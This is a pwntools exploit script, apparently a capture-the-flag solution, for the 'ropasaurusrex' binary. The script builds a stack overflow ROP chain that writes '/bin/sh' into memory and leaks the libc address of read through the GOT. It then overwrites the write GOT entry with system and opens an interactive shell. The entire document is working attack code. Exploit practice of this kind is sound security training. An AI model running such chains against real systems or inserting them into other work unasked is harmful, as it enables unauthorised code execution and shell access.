from pwn import *

# context.log_level="debug"

print("-------------------")
print("---ropasaurusrex---")
print("--pwned by pwnWiz--")
print("-------------------")
print("\n")

r=process("./ropasaurusrex")
e=ELF("./ropasaurusrex")

log.info("Loaded..")

# Address

#plt_read=0x0804832c #plt_write=0x0804830c
plt_read=e.plt['read']  #0x0804832c
plt_write=e.plt['write'] #0x0804830c
got_read=e.got['read']
got_write=e.got['write']

addr_dynamic=0x08049530
addr_pppr=0x080484b6


# Allocating Buffer
payload="A"*136 # buffer
payload+="B"*4 # SFP

# Dynamic Addr -> /bin/sh
payload+=p32(plt_read) #read(fd, buf, size)
payload+=p32(addr_pppr)
payload+=p32(0)
payload+=p32(addr_dynamic)
payload+=p32(len("/bin/sh"))

# Leak system_libc
payload+=p32(plt_write) #write(fd, buf, size)
payload+=p32(addr_pppr)
payload+=p32(1)
payload+=p32(got_read) #leak addr of got_read => addr_system=got_read-offset
payload+=p32(0x4) # 32bit addr

# GOT overwrite
payload+=p32(plt_read)
payload+=p32(addr_pppr)
payload+=p32(0)
payload+=p32(got_write) #overwrite write with system
payload+=p32(0x4)

# Exploit
payload+=p32(plt_write) #use plt_write as system
payload+=p32(0x41414141) 
payload+=p32(addr_dynamic)

# send

r.send(payload)
r.send("/bin/sh") #send /bin/sh to addr_dynamic
leak_libc=u32(r.recv(4))  #recv got_read
offset=0x9ad50
addr_system=leak_libc-offset #got_read - offset(=p read-system)
r.sendline(p32(addr_system))
r.interactive()
